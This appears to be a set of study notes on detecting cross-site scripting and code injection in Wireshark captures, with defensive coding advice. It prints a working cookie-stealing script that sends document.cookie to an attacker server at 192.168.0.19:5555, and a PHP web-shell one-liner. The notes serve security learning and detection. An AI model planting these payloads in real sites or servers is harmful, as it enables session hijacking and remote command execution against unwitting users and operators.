---
title: 23. XSS & Code Injection Detection
updated: 2025-09-18 05:40:32Z
created: 2025-09-17 04:23:52Z
---

# Cross-Site Scripting (XSS) & Code Injection Detection

## 1\. What We’re Looking For

When analyzing traffic in Wireshark, suspicious HTTP requests going to **unexpected internal servers** can indicate an attack. If we see user **cookies or session tokens** being sent out in these requests, it’s a red flag for **XSS exploitation**.

- Example: Requests between `192.168.10.3` and `192.168.10.5` contain cookie values in the query string.
    
- In real-world cases, these values may not be in plain text — they could be **encoded** or **encrypted**.
    

* * *

## 2\. How XSS Works

- Attackers inject **malicious JavaScript** into a vulnerable web application (for example, a comment box or search field).
    
- When another user visits the page, their browser **executes the script**.
    
- The script can steal sensitive data like:
    
    - **Cookies**
        
    - **Session tokens**
        
    - **Authentication values**
        
- The stolen data is often sent to an attacker-controlled server.
    

* * *

## 3\. Example from the PCAP

Captured malicious script inside a user comment:

```javascript
<script>
  window.addEventListener("load", function() {
    const url = "http://192.168.0.19:5555";
    const params = "cookie=" + encodeURIComponent(document.cookie);
    const request = new XMLHttpRequest();
    request.open("GET", url + "?" + params);
    request.send();
  });
</script>

```

What this does:

- Waits until the page loads.
    
- Reads the victim’s cookies (`document.cookie`).
    
- Sends them via a GET request to the attacker’s server at `192.168.0.19:5555`.
    

If you followed this request in Wireshark, you’d likely see:

- **HTTP GET** containing the cookie in the URL
    
- Server response (could be `404 Not Found`, but the attacker already has the cookie)
    

* * *

## 4\. Code Injection Beyond XSS

Attackers may also attempt **server-side code injection** (e.g., via PHP). Two common examples:

### Remote Command Execution

&lt;?php system(\$\_GET\['cmd'\]); ?&gt;

- Attacker can run commands on the server by supplying `?cmd=whoami` in the URL.

### Single Command Execution

&lt;?php echo \`whoami\` ?&gt;

- Executes the `whoami` command and returns the result directly in the page output.

* * *

## 5\. Defensive Measures

To prevent XSS and code injection, apply **secure coding practices**:

1.  **Sanitize Input**
    
    - Strip or escape dangerous characters (`<`, `>`, `&`, `"`, `'`, etc.) from user input.
        
    - Use libraries or frameworks that enforce strong input validation.
        
2.  **Don’t Execute User Input as Code**
    
    - Never directly pass user input into interpreters like PHP’s `system()` or JavaScript’s `eval()`.
3.  **Other Best Practices**
    
    - Use Content Security Policy (CSP) to restrict what scripts can run.
        
    - Implement output encoding (e.g., display user input safely without letting it execute).
        
    - Regularly patch and update your web server and frameworks.
        

* * *

In short:

- **XSS = client-side attack** (steals cookies/tokens via browser).
    
- **Code injection = server-side attack** (executes arbitrary code on the server).
    
- Detection often shows up in **HTTP requests with abnormal payloads** (like cookies being exfiltrated).
    
- Prevention relies on **input handling + secure coding**.
    

&nbsp;